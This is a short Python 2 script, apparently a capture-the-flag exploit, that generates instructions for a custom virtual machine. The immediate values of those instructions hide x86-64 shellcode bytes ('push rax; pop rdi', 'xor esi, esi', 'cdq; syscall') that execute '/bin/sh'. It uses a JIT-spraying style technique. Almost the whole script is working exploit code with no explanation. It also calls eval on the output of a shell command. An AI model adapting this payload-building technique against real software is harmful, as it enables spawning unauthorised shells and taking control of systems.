from gen import *
import os

data=int(invert(5,2**8))

res=[]

pc = 1
def _(str):
	global pc
	pc += 1
	res.append(str)
	return str

def jmp(addr):
	_('JMP(%s)'%addr)

def mov(reg, value):
	_('MOV(%s, %s)'%(reg,value))

def add(value):
	_('ADD(A, %s)' % value)

def sub(value):
	_('SUB(A, %s)' % value)

def sum():
	_('SUM()')

def ret():
	_('RET()')

def store(reg, pos):
	_('STR(%s, %s)'%(reg,pos))

def load(reg, pos):
	_('LDR(%s, %s)'%(reg,pos))

def x(value):
	data=eval(os.popen('gen %s %s' % (value, 0xff)).read().split(': ')[1][:-2])
	return ''.join(map(lambda x: rev[x], data))

def xx(value,mask=None):
	if mask is None:
		mask = 0x1ffffff
	data=eval(os.popen('gen %s %s' % (value, mask)).read().split(': ')[1][:-2])
	return ''.join(map(lambda x: rev[x], data))

# x=xx

payload = '/bin/sh'

if True:
	jmp(x(pc+data))
	mov('A', xx(0x07eb99))

	jmp(x(pc+data))
	# push rax; pop rdi
	mov('A', xx(0x5f5441))

	# xor esi, esi
	jmp(x(pc+data))
	mov('A', xx(0xf631))

def bswap(text):
	return int(bin(text)[2:].zfill(24), 2)

mov('A', xx(bswap(0x62696e)))
jmp(x(pc+data))
mov('A', xx(0x9fc80f))

add(0x622f-0x064c)
store('A', 0)

mov('A',xx(bswap(0x2f7368)))

jmp(x(pc+data))
mov('A', xx(0x9fc80f))
add(0x2f2f-0x02d2)

store('A', 1)

mov('A', 0x3b)
# cdq; syscall
jmp(x(pc+data))
mov('A', xx(0x050f99))


for i in range(500):
	ret()

f = open('result','wb')
for item in res:
	print >> f, '"%s",'%`item`[1:-1]

print '\n'.join(res)
